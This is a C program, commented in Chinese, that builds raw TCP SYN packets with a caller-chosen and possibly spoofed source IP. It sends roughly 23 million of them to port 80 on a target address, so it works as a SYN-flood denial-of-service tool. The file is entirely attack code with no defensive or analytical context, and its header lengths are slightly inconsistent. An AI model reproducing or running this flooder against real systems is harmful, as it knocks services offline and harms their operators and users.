#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

struct tcp_options {
    u_int8_t op0;
    u_int8_t op1;
    u_int8_t op2;
    u_int8_t op3;
    u_int8_t op4;
    u_int8_t op5;
    u_int8_t op6;
    u_int8_t op7;
};

uint16_t csum(uint16_t *addr, int len) {
    int nleft = len;
    uint32_t sum = 0;
    uint16_t *w = addr;
    uint16_t answer = 0;

    while (nleft > 1) {
        sum += *w++;
        nleft -= 2;
    }
    if (nleft == 1) {
        *(unsigned char *) (&answer) = *(unsigned char *) w;
        sum += answer;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (uint16_t) ~sum;
    return (answer);
}

int main(int argc, char *argv[]) {
    if (getuid()) {
        fprintf(stderr, "You must be root to run this program\n");
        exit(1);
    }
    if (argc != 3) {
        fprintf(stderr, "Usage: %s src_ip dst_ip\n", argv[0]);
        fprintf(stderr, "E.g: %s 192.168.1.1 192.168.1.12\n", argv[0]);
        exit(1);
    }

    /* 创建原始套接字并可以自定义 IP 首部 */
    int sockfd;
    if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < 0) {
        fprintf(stderr, "socket failure!\n");
        exit(1);
    }
    int on = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
        fprintf(stderr, "setsockopt failure!\n");
        exit(1);
    }

    unsigned char buf[BUFSIZ];
    unsigned char pheader[1024];
    char src_ip[17];
    char dst_ip[17];
    short dst_port = 80;
    short th_sport = 6666;
    short pig_ack = 0;

    snprintf(src_ip, 16, "%s", argv[1]);
    snprintf(dst_ip, 16, "%s", argv[2]);

    struct ip *ip = (struct ip *) buf;
    struct tcphdr *tcp = (struct tcphdr *) (buf + sizeof(struct ip));
    struct tcp_options *tcpopt = (struct tcp_options *) (buf + sizeof(struct ip) + sizeof(struct tcphdr));

    struct sockaddr_in target;
    int tcp_size;

    memset(buf, 0, sizeof(buf));

    target.sin_family = AF_INET;
    inet_pton(AF_INET, dst_ip, &target.sin_addr);

    ip->ip_hl = 5;
    ip->ip_v = 4;
    ip->ip_tos = 0;
    ip->ip_len = sizeof(struct ip) + sizeof(struct tcphdr) + 8 + 6 + 6;
    ip->ip_id = htons(31337);
    ip->ip_off = 0;
    ip->ip_ttl = 64;
    ip->ip_p = 6;
    ip->ip_sum = 0;
    inet_pton(AF_INET, src_ip, &(ip->ip_src));
    ip->ip_dst.s_addr = target.sin_addr.s_addr;

    tcp->th_sport = htons(th_sport);
    tcp->th_dport = htons(dst_port);
    tcp->th_seq = htonl(31337);
    tcp->th_ack = htonl(pig_ack);
    tcp->th_x2 = 0;
    tcp->th_off = 7 + 2 + 1;

    tcp->th_flags = TH_SYN;
    tcp->th_win = htons (57344);
    tcp->th_sum = 0;
    tcp->th_urp = 0;

    tcp_size = 40;

    memset(pheader, 0x0, sizeof(pheader));
    memcpy(&pheader, &(ip->ip_src.s_addr), 4);
    memcpy(&pheader[4], &(ip->ip_dst.s_addr), 4);
    pheader[8] = 0;
    pheader[9] = ip->ip_p;
    pheader[10] = (unsigned char) ((tcp_size & 0xFF00) >> 8);
    pheader[11] = (unsigned char) (tcp_size & 0x00FF);

    memcpy(&pheader[12], tcp, sizeof(struct tcphdr));
    memcpy(&pheader[12 + sizeof(struct tcphdr)], tcpopt, sizeof(struct tcp_options));

    /* 计算校验和 */
    tcp->th_sum = csum((uint16_t *) (pheader), tcp_size + 12);

    for (int i = 0; i < ip->ip_len; i++) {
        printf("%02x ", buf[i]);
        if (i % 4 == 3) {
            printf("\n");
        }
    }

    int t = 23333333;
    while (t--) {
        if (sendto(sockfd, buf, ip->ip_len, 0, (struct sockaddr *) &target, sizeof(target)) < 0) {
            fprintf(stderr, "sendto failure\n");
            fprintf(stderr, "%s\n", strerror(errno));
            exit(1);
        }
    }

    printf("done\n");
    exit(0);
}
